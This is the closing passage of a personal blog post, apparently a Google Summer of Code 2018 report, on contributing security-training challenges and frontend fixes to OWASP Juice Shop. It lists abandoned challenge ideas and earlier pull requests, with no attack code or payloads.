<li>ImageTragick Challenge<br> The reason behind abandoning this challenge was that it required a vulnerable imagemagick binary to be installed on users personal system which might cause big concerns regarding safety of users systems.</li>
<li>Angular Template Injection Challenge</li>
<li>Facebook Oauth Challenge<br> I planned to add this challenge as soon as the SSTi-SSRF PR gets merged.</li>
</ol>
<h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><p>Apart from working on challenge pack, I also helped fix some of the broken functinalities after the major merging of <code>Frontend Upgrade</code> project into <code>Challenge Pack</code>. This was quite time taking as only @Aashish knew about the new frontend codebase. But this frontend technology upgrade was very much required for Juice Shop as it aims to properly be like modern JS web applications.</p>
<h1 id="Contributions-before-official-start-of-GSoC-2018"><a href="#Contributions-before-official-start-of-GSoC-2018" class="headerlink" title="Contributions before official start of GSoC-2018"></a>Contributions before official start of GSoC-2018</h1><hr>
<ol>
<li><a href="https://github.com/bkimminich/juice-shop/pull/480" target="_blank" rel="noopener">CAPTCHA on feedbackform and Challenge</a></li>
<li><a href="https://github.com/bkimminich/juice-shop/pull/460" target="_blank" rel="noopener">Easter Egg Customization</a></li>
<li><a href="https://github.com/bkimminich/juice-shop/pull/452" target="_blank" rel="noopener">Rate Limiting and its circumventionn challenge</a></li>
<li><a href="https://github.com/bkimminich/juice-shop/pull/444" target="_blank" rel="noopener">Customization in Product Tampering Challenge</a></li>
<li><a href="https://github.com/bkimminich/juice-shop/pull/500" target="_blank" rel="noopener">Order Tracking Dashboard</a></li>
</ol>
<hr>
<p>Hope you learnt something new after reading this. If you haven‚Äôt already read my <a href="https://blog.shoebpatel.me/2018/08/18/Google-Summer-of-Code-2018/" target="_blank" rel="noopener"><code>Google Summer of Code 2018</code></a> blog then please read it ‚òù.<br>I had very good learning experience while working for OWASP Juice Shop. I will recommend every student who loves web security and developement to contribute to the Juice Shop Project.</p>
<p>Thanks for reading the blog post.<br>GodSpeed and Happy Hacking üòé.</p>
<p><img src="https://media.giphy.com/media/HAonhTZTaQE24/giphy.gif" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> GSoC 2018 </tag>
            
            <tag> OWASP </tag>
            
            <tag> Web-Security </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
